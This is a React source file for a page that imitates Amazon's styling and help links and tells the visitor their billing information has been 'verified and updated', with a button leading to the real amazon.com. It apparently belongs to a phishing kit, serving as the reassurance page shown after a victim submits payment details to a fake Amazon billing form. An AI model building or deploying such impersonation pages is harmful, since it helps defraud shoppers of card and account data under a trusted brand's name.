import React from "react";
import { Link } from "react-router-dom";
import Logo from "../../components/Logo/Logo";
import { MdCheckCircle } from "react-icons/md";

const Success = () => {
  return (
    <div className="min-h-screen flex flex-col items-center pt-8 px-4">
      <Logo />

      <div className="w-full max-w-[600px] mt-8 text-center">
        <div className="bg-white p-8 rounded">
          <MdCheckCircle className="text-[#067D62] text-6xl mx-auto mb-4" />

          <h1 className="text-[#067D62] text-2xl font-medium mb-4">
            Billing information successfully updated
          </h1>

          <p className="text-gray-600 mb-6">
            Your billing information has been verified and updated. You can now
            continue shopping on Amazon.
          </p>

          <div className="border-t border-gray-200 pt-6 mt-6">
            <a
              href="https://www.amazon.com"
              target="_blank"
              rel="noopener noreferrer"
              className="bg-[#FFD814] text-[#0F1111] px-6 py-3 rounded-full font-medium hover:bg-[#F7CA00] inline-block"
            >
              Continue to Amazon.com
            </a>
          </div>

          <div className="mt-8 text-sm text-gray-500">
            <p>
              For your security, you'll be asked to verify your billing
              information periodically.
            </p>
          </div>
        </div>

        <div className="mt-8 text-sm space-x-6">
          <a
            href="https://www.amazon.com/gp/help/customer/display.html"
            target="_blank"
            rel="noopener noreferrer"
            className="text-[#0066c0] hover:text-[#c45500] hover:underline"
          >
            Get help
          </a>
          <a
            href="https://www.amazon.com/gp/help/customer/contact-us"
            target="_blank"
            rel="noopener noreferrer"
            className="text-[#0066c0] hover:text-[#c45500] hover:underline"
          >
            Contact us
          </a>
          <a
            href="https://www.amazon.com/gp/help/customer/display.html"
            target="_blank"
            rel="noopener noreferrer"
            className="text-[#0066c0] hover:text-[#c45500] hover:underline"
          >
            Rate your experience
          </a>
        </div>
      </div>

      <div className="mt-auto py-4 text-sm space-x-6">
        <a
          href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088"
          target="_blank"
          rel="noopener noreferrer"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Conditions of Use
        </a>
        <a
          href="https://www.amazon.com/gp/help/customer/display.html?nodeId=468496"
          target="_blank"
          rel="noopener noreferrer"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Privacy Notice
        </a>
        <a
          href="https://www.amazon.com/gp/help/customer/display.html"
          target="_blank"
          rel="noopener noreferrer"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Help
        </a>
      </div>
    </div>
  );
};

export default Success;
